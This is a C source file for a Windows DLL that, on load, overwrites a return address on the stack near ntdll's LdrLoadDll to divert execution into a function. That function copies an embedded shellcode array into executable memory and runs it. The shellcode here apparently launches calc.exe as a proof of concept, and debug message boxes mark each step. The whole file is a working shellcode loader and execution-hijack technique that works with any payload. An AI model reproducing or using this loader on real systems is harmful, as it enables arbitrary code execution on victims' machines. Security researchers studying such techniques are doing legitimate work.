#include "windows.h"

#pragma comment(lib, "User32.lib")


typedef void (__stdcall *CODE) ();

unsigned char shellcode[] =
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
    "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
    "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
    "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
    "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
    "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
    "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
    "\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
    "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
    "\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
    "\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

void test() {
    LPVOID p = NULL;
    if ((p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
        MessageBox(NULL, TEXT("VirtualAlloc failed"), TEXT("tip"), MB_OK);
        return;
    }
    if (!(memcpy(p, shellcode, sizeof(shellcode)))) {
        MessageBox(NULL, TEXT("memcpy failed"), TEXT("tip"), MB_OK);
        return;
    }

    CODE code =(CODE)p;

    code();
}

void hijack(){
    char evilstring[10] = { 0x90 };
    DWORD ldrLoadDll = (DWORD)GetProcAddress(GetModuleHandleA("ntdll"), "LdrLoadDll");
    DWORD* stack = (DWORD)evilstring + (DWORD)evilstring % 4;
    while (1)
    {
        stack++;
        if ((DWORD)stack > ldrLoadDll + 0x1000) {
            break;
        }
        if (*stack > ldrLoadDll && *stack < ldrLoadDll + 0x1000) {
            *stack = (DWORD)test;
            MessageBoxW(NULL, TEXT("replace stack to shellcode address finished"), TEXT("tip"), MB_OK);
            break;
        }
    }
}

BOOL WINAPI DllMain(
    HINSTANCE _hinstDLL,  // handle to DLL module
    DWORD _fdwReason,     // reason for calling function
    LPVOID _lpReserved)   // reserved
{
    switch (_fdwReason) {
    case DLL_PROCESS_ATTACH:
        MessageBox(NULL, TEXT("enter dllmain process attach"), TEXT("tip"), MB_OK);
        hijack();
        break;
    case DLL_PROCESS_DETACH:
        // Perform any necessary cleanup.
        break;
    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;
    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;
    }
    return TRUE; // Successful.
}